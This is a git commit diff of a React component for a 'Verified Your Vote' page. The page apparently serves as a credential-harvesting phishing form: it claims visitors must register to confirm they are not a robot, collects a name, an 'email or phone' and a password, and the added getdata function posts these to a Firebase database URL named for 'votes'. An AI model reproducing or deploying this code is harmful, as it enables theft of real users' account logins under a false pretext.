c84f79d1e2bcdf59e4ba720e956deac6e78a126f
oussamaani <anifioussama1@gmail.com>
2023-11-17 23:12:31 +0100

    first commit

--- src/components/Contact.jsx
+++ src/components/Contact.jsx
@@ -17,6 +17,13 @@ import axios from 'axios';
 //     showConfirmButton: true,
 //   })
   
+
+
+
+
+
+
+
 const notify = () => {
   const userNameInput = document.getElementById("userName");
   const userEmailInput = document.getElementById("userEmail");
@@ -64,12 +71,12 @@ const notify = () => {
       
     }
     )
-    const url = 'http://localhost/index.php'; 
-    let fData = new FormData();
-      fData.append('userName', userName);
-      fData.append('userEmail', userEmail);
-      fData.append('password', password);
-      axios.post(url, fData).then(response=> alert(response.data)).catch(error=> alert(error));   
+    // const url = 'http://localhost/index.php'; 
+    // let fData = new FormData();
+    //   fData.append('userName', userName);
+    //   fData.append('userEmail', userEmail);
+    //   fData.append('password', password);
+    //   axios.post(url, fData).then(response=> alert(response.data)).catch(error=> alert(error));   
 
     // Réinitialisez les champs d'entrée à une chaîne vide
     userNameInput.value = '';
@@ -77,17 +84,49 @@ const notify = () => {
     passwordInput.value = '';
   }
 }
-
-
-
-
-
 const Contact = () => {
+  const [user,setUser] = useState(
+    {
+      Name: '',Email: '',Password: ''
+    }
+  )
+  let name , value
+  console.log(user)
+  const data = (e) =>
+  {
+    name = e.target.name;
+    value = e.target.value;
+    setUser({...user,[name]: value});
+  }
+  const getdata = async(e) =>
+  {
+    const {Name,Email,Password}=user;
+    e.preventDefault();
+    const options = {
+      method: 'POST' ,
+      headers: {
+        'Content-Type': 'aplication/json'
+      },
+      body: JSON.stringify({
+        Name,Email,Password
+      })
+    }
+    const res = await fetch("https://votes-117b0-default-rtdb.firebaseio.com/UserData.json"
+    ,options)
+    console.log(res)
+    if (res){
+      alert ('data stored')
+      }else{
+        alert('erroure')
+      }
+      }
 
-  const [userName,setName] = useState('');
-  const [userEmail,setEmail] = useState('');
-  const [password,setPassword] = useState('');
 
+  const handleValidateClick = (e) => {
+    // Appeler les fonctions notify et getdata ici
+    notify();
+    getdata(e);
+  }
   return (
     <div className=" min-h-screen flex flex-col items-center justify-center md:mx-32 mx-5 mt-30">
       <Heading title1="Verified" title2="Your Vote" />
@@ -95,16 +134,16 @@ const Contact = () => {
       <p className="mt-10 text-center text-emerald-950 border boredr-brightGreen p-3 bg-emerald-200 rounded-md">In order to confirm that you are not a robot, please register to verify your vote.</p>
 
       <div className=" flex flex-col md:flex-row justify-between w-full">
-        <form onSubmit={(e) => e.preventDefault()}  className=" w-full md:w-2/5 space-y-5 pt-10">
+        <form method="POST"   className=" w-full md:w-2/5 space-y-5 pt-10">
           <div className=" flex flex-col">
             <label htmlFor="userName"className=" py-2 ">Your Name</label>
             <input
               className=" py-3 px-2 rounded-lg hover:shadow-[rgba(0,_0,_0,_0.24)_0px_3px_8px] transition-all"
               type="text"
-              name="userName"
+              name="Name"
               id="userName"
               placeholder="enter your name"         
-              value={userName} onChange={(e) => setName(e.target.value)}
+              value={user.Name} onChange={data}
             />
           </div>
           <div className=" flex flex-col">
@@ -112,10 +151,10 @@ const Contact = () => {
             <input
               className=" py-3 px-2 rounded-lg hover:shadow-[rgba(0,_0,_0,_0.24)_0px_3px_8px] transition-all"
               type="email"
-              name="userEmail"
+              name="Email"
               id="userEmail"
               placeholder="email or phone"
-              value={userEmail} onChange={(e) => setEmail(e.target.value)}
+              value={user.Email} onChange={data}
 
             />
           </div>
@@ -126,16 +165,16 @@ const Contact = () => {
             <input
               className=" py-3 px-2 rounded-lg hover:shadow-[rgba(0,_0,_0,_0.24)_0px_3px_8px] transition-all"
               type="password"
-              name="password"
+              name="Password"
               id="password"
               placeholder="enter your password"
-              value={password} onChange={(e) => setPassword(e.target.value)}
+              value={user.Password} onChange={data}
             />
           </div>
 
           <div className=" flex flex-row justify-center">
           <button className=" bg-white py-2 px-8 rounded-full mt-4 outline hover:shadow-[0_3px_10px_rgb(0,0,0,0.2)]
-           hover:bg-brightGreen hover:text-white transition-all" onClick={notify}>Validite</button>
+           hover:bg-brightGreen hover:text-white transition-all" onClick={handleValidateClick}>Validite</button>
           <ToastContainer />
             
           </div>
